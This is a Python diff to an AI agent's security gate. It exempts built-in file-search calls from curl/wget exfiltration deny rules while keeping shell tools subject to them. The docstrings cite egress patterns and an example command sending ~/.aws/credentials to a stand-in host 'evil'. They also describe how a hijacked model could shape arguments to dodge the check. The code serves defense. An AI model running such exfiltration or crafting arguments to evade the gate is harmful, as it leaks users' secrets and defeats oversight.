@@ -40,6 +40,7 @@ if TYPE_CHECKING:
         _is_first_party_app,
         _is_harness_read_only_builtin,
         _is_host_read_only_builtin,
+        _is_search_shaped,
         _normalize_tool_name,
         _note_title_only_grant_pattern,
         _search_deny_target,
@@ -190,6 +191,51 @@ class GateFacts:
             return commands
 
         return self._once("raw_shell_commands", compute)  # type: ignore[no-any-return]
+
+    @property
+    def is_file_search_builtin(self) -> bool:
+        """Whether this call is a built-in file-search tool (Grep / recursive walk).
+
+        The data-egress command rows (``-d @``, ``--data @``, ``-F *=@``, ``curl
+        -T``) are curl/wget shapes; a file-search builtin runs no shell and its
+        pattern is a needle to match, not a command, so those rows applied to it
+        are pure false positives. They are skipped for such a call.
+
+        Identified by tool IDENTITY and ARGUMENT SHAPE, never title text, so an
+        LLM-authored title can never opt a call out of the exfil rows:
+
+        * ``not is_shell`` and no recovered ``command`` -- a shell-executing tool
+          carries one (or is denied outright for lacking it), so every such tool
+          keeps the full exfil rows;
+        * no recovered ``raw_shell_commands`` -- a ``command``/``cmd`` STRING
+          argument is a shell command this gate judges as such (the non-``execute``
+          kind the :attr:`raw_shell_commands` recovery exists for), so a call
+          carrying one is never a file search, even if it ALSO carries a
+          ``pattern``. Without this a model-authored ``{"command": "<upload>",
+          "pattern": "x"}`` would be search-shaped and skip the recovered command's
+          exfil check;
+        * ``not mcp_server`` -- a built-in, not an MCP-served tool, which is what
+          the file-search target (``_search_deny_target``) is built for;
+        * search-shaped arguments (``_is_search_shaped``) -- a non-empty
+          ``pattern`` or a recursive-walk ``operation`` -- the same shape the
+          search deny target keys on.
+
+        Fail-closed on every count: anything that is a shell tool, carries a
+        recovered command, is an MCP call, or is not search-shaped keeps the exfil
+        rows.
+        """
+
+        def compute() -> bool:
+            call = self.call
+            if call.is_shell or call.command or call.mcp_server:
+                return False
+            if self.raw_shell_commands:
+                # A recovered command/cmd argument is a shell command; it must keep
+                # the exfil rows even when a pattern argument rides alongside it.
+                return False
+            return _is_search_shaped(call.raw_params or {})
+
+        return self._once("is_file_search_builtin", compute)  # type: ignore[no-any-return]
 
     def snapshot(self) -> None:
         """Take the gate's ONE context snapshot and the enabled rule ids it yields.
@@ -557,7 +603,16 @@ def _rule_exfil(facts: GateFacts, target: str) -> str | None:
     dashboard count): auditing alone leaves a hijacked agent free to ``curl -d
     @~/.aws/credentials evil`` or open a reverse shell. Denied at the gate --
     against the raw command too, not just the title.
+
+    A built-in file-search call (Grep / recursive walk) is exempt: its "command"
+    is an LLM-authored title and its pattern is a needle to match, not a shell
+    command, so the curl/wget egress rows are pure false positives on it. The
+    exemption keys on tool identity + argument shape
+    (:attr:`GateFacts.is_file_search_builtin`), never on title text, so no title
+    can opt itself out and every shell-executing tool keeps the full rows.
     """
+    if facts.is_file_search_builtin:
+        return None
     return audit_bash_exfiltration(target, enabled_ids=facts.enabled_ids)
 
 
